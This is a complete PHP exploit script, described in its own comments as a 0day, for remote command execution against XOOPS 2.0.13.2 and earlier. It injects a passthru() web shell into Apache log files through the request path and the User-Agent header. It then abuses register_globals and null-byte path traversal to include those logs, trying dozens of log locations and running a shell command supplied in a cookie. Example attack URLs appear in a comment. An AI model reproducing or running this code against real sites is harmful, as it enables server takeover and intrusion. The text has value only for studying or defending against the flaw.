#!/usr/bin/php -q -d short_open_tag=on
<?
echo "XOOPS <= 2.0.13.2 'xoopsOption[nocommon]' exploit\r\n";
echo "by rgod rgod@autistici.org\r\n";
echo "site: http://retrogod.altervista.org\r\n\r\n";

/*
 works with:
  magic_quotes_gpc = Off
  register_globals = On
*/

if ($argc<4) {
echo "Usage: php ".$argv[0]." host path cmd OPTIONS\r\n";
echo "host:      target server (ip/hostname)\r\n";
echo "path:      path to xoops\r\n";
echo "cmd:       a shell command\r\n";
echo "Options:\r\n";
echo "   -p[port]:    specify a port other than 80\r\n";
echo "   -P[ip:port]: specify a proxy\r\n";
echo "Examples:\r\n";
echo "php ".$argv[0]." localhost /xoops/ \r\n";
echo "php ".$argv[0]." localhost /xoops/ ls -la -p81\r\n";
echo "php ".$argv[0]." localhost / ls -la -P1.1.1.1:80\r\n";
die;
}

/* hi, back from my annual social engineering tour, this year in Milan ;)
   welcome to this new 0day experience...
   explaination:

   vulnerable code in mainfile.php at lines 94-96:
   ...
   if (!isset($xoopsOption['nocommon']) && XOOPS_ROOT_PATH != '') {
                include XOOPS_ROOT_PATH."/include/common.php";
        }
   ...

   if register_globals = On you can overwrite $xoopsOption['nocommon'] var, to
   skip common.php inclusion where $xoopsConfig['language'] and
   $xoopsConfig['theme_set] are initialized, so, if magic_quotes_gpc=Off
   you can include arbitrary files from local resources, ex., Apache log files:

   http://[target]/[path]/misc.php?cmd=ls%20-la&xoopsOption[nocommon]=1&xoopsConfig[language]=../../../../../../../../../../var/log/httpd/access_log%00
   http://[target]/[path]/index.php?cmd=ls%0-la&xoopsOption[nocommon]=1&xoopsConfig[theme_set]=../../../../../../../../../../var/log/httpd/error_log%00

   or, if avatar uploads are enabled:

   http://[target]/xoops/html/index.php?cmd=ls%20-la&xoopsOption[nocommon]=1&xoopsConfig[theme_set]=../uploads/cavt44703c30d3dbf.jpg%00

   this tool inject some php code in apache log files and try to launch commands
                                                                              */

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
        $c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
        }
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo "\r\n".$html;
}

$host=$argv[1];
$path=$argv[2];
$cmd="";$port=80;$proxy="";

for ($i=3; $i<=$argc-1; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P"))
{$cmd.=" ".$argv[$i];}
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
$cmd=urlencode($cmd);
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

echo "[1] Injecting some code in log files ...\r\n\r\n";
$CODE="*delim*<?php error_reporting(0);set_time_limit(0);passthru(\$_COOKIE[cmd]);die;?>";
$packet="GET ".$p.$CODE." HTTP/1.0\r\n";
$packet.="User-Agent: ".$CODE." Googlebot/2.1\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: close\r\n\r\n";
sendpacketii($packet);
sleep(1);

//fill with possible locations...
$paths=array(
"../../../../../../../../../../var/log/httpd/access_log",
"../../../../../../../../../../var/log/httpd/error_log",
"../apache/logs/error.log",
"../apache/logs/access.log",
"../../apache/logs/error.log",
"../../apache/logs/access.log",
"../../../apache/logs/error.log",
"../../../apache/logs/access.log",
"../../../../apache/logs/error.log",
"../../../../apache/logs/access.log",
"../../../../../apache/logs/error.log",
"../../../../../apache/logs/access.log",
"../../../../../../apache/logs/error.log",
"../../../../../../apache/logs/access.log",
"../logs/error.log",
"../logs/access.log",
"../../logs/error.log",
"../../logs/access.log",
"../../../logs/error.log",
"../../../logs/access.log",
"../../../../logs/error.log",
"../../../../logs/access.log",
"../../../../../logs/error.log",
"../../../../../logs/access.log",
"../../../../../../logs/error.log",
"../../../../../../logs/access.log",
"../../../../../../../../../../etc/httpd/logs/acces_log",
"../../../../../../../../../../etc/httpd/logs/acces.log",
"../../../../../../../../../../etc/httpd/logs/error_log",
"../../../../../../../../../../etc/httpd/logs/error.log",
"../../../../../../../../../../var/www/logs/access_log",
"../../../../../../../../../../var/www/logs/access.log",
"../../../../../../../../../../usr/local/apache/logs/access_log",
"../../../../../../../../../../usr/local/apache/logs/access.log",
"../../../../../../../../../../var/log/apache/access_log",
"../../../../../../../../../../var/log/apache/access.log",
"../../../../../../../../../../var/log/access_log",
"../../../../../../../../../../var/www/logs/error_log",
"../../../../../../../../../../var/www/logs/error.log",
"../../../../../../../../../../usr/local/apache/logs/error_log",
"../../../../../../../../../../usr/local/apache/logs/error.log",
"../../../../../../../../../../var/log/apache/error_log",
"../../../../../../../../../../var/log/apache/error.log",
"../../../../../../../../../../var/log/access_log",
"../../../../../../../../../../var/log/error_log"
);

$xpl= array (
             "misc.php?xoopsOption[nocommon]=1&xoopsConfig[language]=",
             "index.php?xoopsOption[nocommon]=1&xoopsConfig[theme_set]="
             );

for ($j=0; $j<=count($xpl)-1; $j++)
{
  for ($i=0; $i<=count($paths)-1; $i++)
  {
  $a=$i+2;
  echo "[".$a."] Trying with: ".$xpl[$j].$paths[$i]."%00\r\n";
  $packet ="GET ".$p.$xpl[$j].$paths[$i]."%00 HTTP/1.0\r\n";
  $packet.="Host: ".$host."\r\n";
  $packet.="Cookie: cmd=".$cmd.";\r\n";
  $packet.="Connection: Close\r\n\r\n";
  #debug
  #echo quick_dump($packet);
  sendpacketii($packet);
  if (strstr($html,"*delim*"))
    {
      echo "Exploit succeeded...\r\n";
      $temp=explode("*delim*",$html);
      die($temp[1]);
    }
  }
}
//if you are here...
echo "Exploit failed...";
?>
